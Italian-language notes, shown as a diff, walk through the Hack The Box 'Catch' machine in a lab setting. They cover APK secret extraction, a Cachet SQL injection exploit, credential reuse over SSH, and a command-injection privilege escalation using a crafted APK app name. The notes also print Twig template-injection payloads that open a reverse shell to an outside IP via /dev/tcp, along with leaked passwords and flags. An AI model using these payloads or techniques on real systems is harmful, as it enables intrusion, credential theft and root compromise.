@@ -1,0 +1,471 @@
+10.10.11.150
+
+
+port 5000 -> lets chat
+port 3000 -> gitea 
+
+
+
+port 80:
+
+
+Exciting services ever launched by Catch!
+We're now providing mobile version of our status site.
+
+The future enhancements includes Lets-chat/Gitea integration
+
+mi permette di scaricare un apk
+
+cerco di analizzare l'apk
+
+apktool d catchv1.0.apk 
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+I: Using Apktool 2.6.1-dirty on catchv1.0.apk
+I: Loading resource table...
+I: Decoding AndroidManifest.xml with resources...
+I: Loading resource table from file: /home/kali/.local/share/apktool/framework/1.apk
+I: Regular manifest package...
+I: Decoding file-resources...
+I: Decoding values */* XMLs...
+I: Baksmaling classes.dex...
+I: Copying assets and libs...
+I: Copying unknown files...
+I: Copying original files...
+
+
+non mi da il codice java
+
+provo:
+
+https://github.com/pxb1988/dex2jar
+
+ha estratto catchv1.0-dex2jar.jar
+
+per aprire il jar uso https://java-decompiler.github.io/
+
+trovo:
+
+this.mywebView.loadUrl("https://status.catch.htb/");
+
+
+lo metto in /etc/hosts
+non mi fa connettere usando https, solo con http e ho lo stesso sito di prima 
+
+
+provo ad usare anche MobSF per analizzare l'apk:
+
+https://github.com/MobSF/Mobile-Security-Framework-MobSF
+
+infatti analizzandola con mobsf stra gli ahrdcoded secrets c'è:
+
+"gitea_token" : "b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0"
+"lets_chat_token" : "NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ=="
+"slack_token" : "xoxp-23984754863-2348975623103"
+
+porta 8000: altro server web dove c'è:
+
+Powered by Cachet. 
+
+mi chiede di accedere 
+
+c'è una unauthenticated sql injection in cachet:
+
+https://github.com/advisories/GHSA-79mg-4w23-4fqc
+
+https://github.com/W0rty/CVE-2021-39165
+
+python3 exploit.py -u http://status.catch.htb:8000/
+[+] Target is vulnerable !
+[+] User admin exist !
+[+] Running exploit
+[+] Found password length: 60
+[+] Leaking admin password: $2y$10$quY5tcamPWVo54lbyLSWEu00A/tkMlqoFaEKwJSWPVGHp3K2Wj7Om
+[+] admin:$2y$10$quY5tcamPWVo54lbyLSWEu00A/tkMlqoFaEKwJSWPVGHp3K2Wj7Om
+
+provo a crackare l'hash della password
+
+Possible Hashs:
+[+] DES(Unix)
+
+non è DES, sembra essere bcrypt (john quando l'ho lanciato l'ha identificato come bcrypt)
+
+hashcat -a 0 -m 3200 hash-admin /usr/share/wordlists/rockyou.txt
+
+non si riesce a crackare
+
+però se riesco ad accedere forse posso usare un'altra vulnerabilità di cachet:
+
+https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/
+
+
+
+
+dovrei provare a sfruttare uno di questi cookies che ho trovato nell'apk:
+
+
+"gitea_token" : "b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0"
+"lets_chat_token" : "NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ=="
+"slack_token" : "xoxp-23984754863-2348975623103"
+
+facendo delle curl sulle altre porte esposte ho visto che sulla porta 3000 c'è gitea  (Powered by Gitea Version: 1.14.1)
+mentre sulla 5000 c'è lets chat
+
+non mi sembra che per questa versione di gitea ci siano exploit, mentre non conosco la versione di letds chat
+
+potrebbe essere utile vedere se riesco a vedere qualcosa nelle chat da sfruttare
+
+
+per lets_chat_token mi permette di usare le api:
+
+https://github.com/sdelements/lets-chat/wiki/API
+
+https://github.com/sdelements/lets-chat/wiki/API%3A-Rooms#get-rooms
+
+curl  -H "Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" http://status.catch.htb:5000/users
+
+curl  -H "Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" http://status.catch.htb:5000/users
+[{"id":"61b86aead984e2451036eb16","firstName":"Administrator","lastName":"NA","username":"admin","displayName":"Admin","avatar":"e2b5310ec47bba317c5f1b5889e96f04","openRooms":["61b86b28d984e2451036eb17","61b86b3fd984e2451036eb18","61b8708efe190b466d476bfb"]},
+{"id":"61b86dbdfe190b466d476bf0","firstName":"John","lastName":"Smith","username":"john","displayName":"John","avatar":"f5504305b704452bba9c94e228f271c4","openRooms":["61b86b3fd984e2451036eb18","61b86b28d984e2451036eb17"]},
+{"id":"61b86e40fe190b466d476bf2","firstName":"Will","lastName":"Robinson","username":"will","displayName":"Will","avatar":"7c6143461e935a67981cc292e53c58fc","openRooms":["61b86b3fd984e2451036eb18","61b86b28d984e2451036eb17"]},
+{"id":"61b86f15fe190b466d476bf5","firstName":"Lucas","lastName":"NA","username":"lucas","displayName":"Lucas","avatar":"b36396794553376673623dc0f6dec9bb","openRooms":["61b86b28d984e2451036eb17","61b86b3fd984e2451036eb18"]}]
+
+
+curl  -H "Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" http://status.catch.htb:5000/rooms
+
+
+[{"id":"61b86b28d984e2451036eb17","slug":"status","name":"Status","description":"Cachet Updates and Maintenance","lastActive":"2021-12-14T10:34:20.749Z","created":"2021-12-14T10:00:08.384Z","owner":"61b86aead984e2451036eb16","private":false,"hasPassword":false,"participants":[]},
+{"id":"61b8708efe190b466d476bfb","slug":"android_dev","name":"Android Development","description":"Android App Updates, Issues & More","lastActive":"2021-12-14T10:24:21.145Z","created":"2021-12-14T10:23:10.474Z","owner":"61b86aead984e2451036eb16","private":false,"hasPassword":false,"participants":[]},
+{"id":"61b86b3fd984e2451036eb18","slug":"employees","name":"Employees","description":"New Joinees, Org updates","lastActive":"2021-12-14T10:18:04.710Z","created":"2021-12-14T10:00:31.043Z","owner":"61b86aead984e2451036eb16","private":false,"hasPassword":false,"participants":[]}]
+
+
+curl  -H "Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" http://status.catch.htb:5000/rooms/61b86b28d984e2451036eb17/messages
+
+
+[{"id":"61b8732cfe190b466d476c02","text":"ah sure!","posted":"2021-12-14T10:34:20.749Z","owner":"61b86dbdfe190b466d476bf0","room":"61b86b28d984e2451036eb17"},
+{"id":"61b8731ffe190b466d476c01","text":"You should actually include this task to your list as well as a part of quarterly audit","posted":"2021-12-14T10:34:07.449Z","owner":"61b86aead984e2451036eb16","room":"61b86b28d984e2451036eb17"},
+{"id":"61b872b9fe190b466d476c00","text":"Also make sure we've our systems, applications and databases up-to-date.","posted":"2021-12-14T10:32:25.514Z","owner":"61b86dbdfe190b466d476bf0","room":"61b86b28d984e2451036eb17"},
+{"id":"61b87282fe190b466d476bff","text":"Excellent! ","posted":"2021-12-14T10:31:30.403Z","owner":"61b86aead984e2451036eb16","room":"61b86b28d984e2451036eb17"},
+{"id":"61b87277fe190b466d476bfe","text":"Why not. We've this in our todo list for next quarter","posted":"2021-12-14T10:31:19.094Z","owner":"61b86dbdfe190b466d476bf0","room":"61b86b28d984e2451036eb17"},
+{"id":"61b87241fe190b466d476bfd","text":"@john is it possible to add SSL to our status domain to make sure everything is secure ? ","posted":"2021-12-14T10:30:25.108Z","owner":"61b86aead984e2451036eb16","room":"61b86b28d984e2451036eb17"},
+{"id":"61b8702dfe190b466d476bfa","text":"Here are the credentials `john :  E}V!mywu_69T4C}W`","posted":"2021-12-14T10:21:33.859Z","owner":"61b86f15fe190b466d476bf5","room":"61b86b28d984e2451036eb17"},
+{"id":"61b87010fe190b466d476bf9","text":"Sure one sec.","posted":"2021-12-14T10:21:04.635Z","owner":"61b86f15fe190b466d476bf5","room":"61b86b28d984e2451036eb17"},
+{"id":"61b86fb1fe190b466d476bf8","text":"Can you create an account for me ? ","posted":"2021-12-14T10:19:29.677Z","owner":"61b86dbdfe190b466d476bf0","room":"61b86b28d984e2451036eb17"},
+{"id":"61b86f4dfe190b466d476bf6","text":"Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. ","posted":"2021-12-14T10:17:49.761Z","owner":"61b86f15fe190b466d476bf5","room":"61b86b28d984e2451036eb17"}]  
+
+
+
+ci sono delle credenziali per utente john:
+
+
+Here are the credentials `john :  E}V!mywu_69T4C}W`
+
+
+
+
+potrei usarle per cachet e poi prendere rce con l'exploit?
+
+http://10.10.11.150:8000/auth/login
+
+si riesco ad accedere 
+
+non riesco a capire come eseguire l'exploit rce per cachet ma tra le funzionalità che ho a disposizione c'è quella di creazione di una
+incident template 
+
+Incident Templates can make use of the Twig templating language.
+
+
+posso usare twig per eseguire codice 
+
+https://www.exploit-db.com/exploits/44102
+
+
+provo qualche payload 
+
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("sh -i >& /dev/tcp/10.10.14.10/8081 0>&1")}}
+
+{{["bash -c 'sh -i >& /dev/tcp/10.10.14.10/8081 0>&1'"]|filter("system")|join(",")}}
+
+
+non sembra funzionare
+
+devo cercare di far funzionare una di queste vulnerabilità:
+
+https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/
+
+
+provo a seguire prima questo approccio:
+
+CVE-2021-39174 - Configuration Leak
+
+
+per farlo basta andare in settings -> mail 
+
+e inserire il payload nel campo mail from address
+
+poi fare save
+
+
+ora al posto del payload nel mail from address c'è il valore della property indicata nel payload:
+
+${DB_PASSWORD}
+s2#4Fg0_%3!
+
+
+${APP_KEY}      --> Non funziona (?)
+
+
+provo a sfruttare la password ottenuta per vedere se c'è redential reuse 
+
+posso provare a loggarmi con ssh con tutti gli users che c'erano nella chat e le due password che ho trovato:
+
+
+
+
+
+
+
+
+msf6 > use auxiliary/scanner/ssh/ssh_login
+
+msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE password
+PASS_FILE => password
+msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE usernames
+USER_FILE => usernames
+msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 10.10.11.150
+RHOSTS => 10.10.11.150
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+
+[*] 10.10.11.150:22 - Starting bruteforce
+[+] 10.10.11.150:22 - Success: 'will:s2#4Fg0_%3!' 'uid=1000(will) gid=1000(will) groups=1000(will) Linux catch 5.4.0-104-generic #118-Ubuntu SMP Wed Mar 2 19:02:41 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
+[*] SSH session 1 opened (10.10.14.10:37793 -> 10.10.11.150:22 ) at 2022-06-19 10:18:46 -0400
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+si può accedere con will:s2#4Fg0_%3!
+
+
+will@catch:~$ id
+uid=1000(will) gid=1000(will) groups=1000(will)
+will@catch:~$ cat user.txt 
+eb3964f629f158cdc2c56231dc39e730
+will@catch:~$ 
+
+
+will non è sudoers
+
+
+will@catch:~$ sudo -l
+[sudo] password for will: 
+Sorry, user will may not run sudo on catch.
+
+
+
+will@catch:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
+redis:x:114:120::/var/lib/redis:/usr/sbin/nologin
+git:x:115:121:Git Version Control,,,:/home/git:/bin/bash
+mongodb:x:116:122::/var/lib/mongodb:/usr/sbin/nologin
+will:x:1000:1000:,,,:/home/will:/bin/bash
+dnsmasq:x:117:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+
+nessun file particolare come suid
+
+
+will@catch:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/bin/mount
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/passwd
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/su
+will@catch:~$ 
+
+
+nemmeno come sgid
+
+
+will@catch:~$ find / -perm -g=s -type f 2>/dev/null
+/usr/sbin/pam_extrausers_chkpwd
+/usr/sbin/unix_chkpwd
+/usr/lib/x86_64-linux-gnu/utempter/utempter
+/usr/bin/wall
+/usr/bin/ssh-agent
+/usr/bin/expiry
+/usr/bin/bsd-write
+/usr/bin/chage
+/usr/bin/at
+/usr/bin/crontab
+
+
+provo se con pspy si vede qualcosa altrimenti lancio linpeas
+
+IN PSPY:
+
+
+2022/06/19 14:25:13 CMD: UID=0    PID=10032  | /bin/bash -c while true;do /root/check.sh;done 
+
+
+2022/06/19 14:25:13 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity 
+2022/06/19 14:26:01 CMD: UID=0    PID=96272  | /usr/sbin/CRON -f 
+2022/06/19 14:26:01 CMD: UID=0    PID=96271  | /usr/sbin/CRON -f 
+2022/06/19 14:26:01 CMD: UID=0    PID=96273  | /bin/sh -c /opt/mdm/verify.sh 
+2022/06/19 14:26:01 CMD: UID=0    PID=96275  | /bin/sh -c rm -rf /root/mdm/certified_apps/* 
+2022/06/19 14:26:01 CMD: UID=0    PID=96274  | /bin/bash /opt/mdm/verify.sh 
+2022/06/19 14:26:01 CMD: UID=???  PID=96276  | ???
+2022/06/19 14:26:01 CMD: UID=0    PID=96280  | openssl rand -hex 12 
+2022/06/19 14:26:01 CMD: UID=???  PID=96281  | ???
+2022/06/19 14:26:01 CMD: UID=0    PID=96282  | jarsigner -verify /root/mdm/apk_bin/2fa8034a0207353a453db0b8.apk 
+2022/06/19 14:26:02 CMD: UID=0    PID=96305  | 
+2022/06/19 14:26:02 CMD: UID=???  PID=96304  | ???
+2022/06/19 14:26:02 CMD: UID=0    PID=96302  | /bin/bash /opt/mdm/verify.sh 
+
+
+
+
+verify.sh sembra essere interessante, viene eseguito da root 
+(copiato in verify.sh)
+
+ovviamente non posso modificarlo 
+
+will@catch:/opt/mdm$ getfacl verify.sh 
+# file: verify.sh
+# owner: root
+# group: root
+user::rwx
+user:will:r-x
+group::r-x
+mask::r-x
+other::--x
+
+
+
+a quanto pare fa il check di file apk 
+
+visto che non posso dare parametri e non posso modificare il file, devo cercare di fare inject di qualcosa
+
+non fa particolari operazioni utili sui file quindi devo fare command injection
+
+potrei provare a farlo sull'app name del apk:
+
+APP_NAME=$(grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "$1/res/values/strings.xml")
+echo $APP_NAME
+
+
+se riesco a mettere un comando nell'APP_NAME verrà eseguito quando si esegue echo $APP_NAME
+
+per farlo però devo decompilare l'apk originale (che dovrebbe passare i check precedenti), modificare il valore in $1/res/values/strings.xml
+ricompilarlo e metterlo nella directory
+
+
+
+prima cosa lo decompilo:
+
+apktool d catchv1.0.apk
+
+ora devo sostituire:
+
+    <string name="app_name">Catch</string>
+con:
+    <string name="app_name">Catch; cp /bin/bash /tmp/bash; chmod u+s /tmp/bash </string>
+
+
+provo a compilare di nuovo
+
+apktool b catchv1.0
+
+ma ottengo questo errore:
+
+Invalid file name: must contain only [a-z0-9_.]
+
+
+un problema simile risolto ricompilando apk tool:
+
+https://github.com/iBotPeaches/Apktool/issues/2220
+
+compilando una funzione che fa una serie di check sulle risorse 
+
+alla fine era solo un problema di versione, ho scaricato l'ultima e usato quella e ha funzionato:
+
+  445  wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.6.1.jar
+  446  ls -lart
+  447  rm -rf catchv1.0
+  448  java -jar apktool_2.6.1.jar d catchv1.0.apk
+  449  java -jar apktool_2.6.1.jar b catchv1.0.apk
+  450  java -jar apktool_2.6.1.jar b catchv1.0/ -o modified.apk
+
+
+ora lo metto sotto /opt/mdm/apk_bin e dopo poco dovrei avere l'eseguibile di bash con suid sotto tmp
+
+
+will@catch:/opt/mdm/apk_bin$ ls -lart /tmp
+total 4220
+drwxr-xr-x 19 root root    4096 Mar  3 14:42 ..
+-rwxr-xr-x  1 will will 3078592 Jun  5 16:59 pspy64
+drwxrwxrwt  2 root root    4096 Jun 19 10:32 .XIM-unix
+drwxrwxrwt  2 root root    4096 Jun 19 10:32 .X11-unix
+drwxrwxrwt  2 root root    4096 Jun 19 10:32 .Test-unix
+drwx------  3 root root    4096 Jun 19 10:32 systemd-private-9423f221b7434087be9417eb7e2bc460-systemd-resolved.service-inOw6e
+drwxrwxrwt  2 root root    4096 Jun 19 10:32 .ICE-unix
+drwxrwxrwt  2 root root    4096 Jun 19 10:32 .font-unix
+drwx------  3 root root    4096 Jun 19 10:32 systemd-private-9423f221b7434087be9417eb7e2bc460-systemd-timesyncd.service-ghfE9f
+drwx------  3 root root    4096 Jun 19 10:32 systemd-private-9423f221b7434087be9417eb7e2bc460-apache2.service-N42o2e
+drwx------  3 root root    4096 Jun 19 10:32 systemd-private-9423f221b7434087be9417eb7e2bc460-systemd-logind.service-mlseWg
+drwx------  3 root root    4096 Jun 19 10:33 systemd-private-9423f221b7434087be9417eb7e2bc460-ModemManager.service-MgiJyg
+drwx------  2 root root    4096 Jun 19 10:33 vmware-root_657-4022112241
+drwxr-xr-x  2 root root    4096 Jun 19 16:33 hsperfdata_root
+drwxrwxrwt 14 root root    4096 Jun 19 16:33 .
+-rwsr-xr-x  1 root root 1183448 Jun 19 16:33 bash
+
+
+
+
+will@catch:/opt/mdm/apk_bin$ /tmp/bash -p
+bash-5.0# id
+uid=1000(will) gid=1000(will) euid=0(root) groups=1000(will)
+bash-5.0# cat /root/root.txt 
+8c37113cdd4965a94309470ed32542e0
+
+
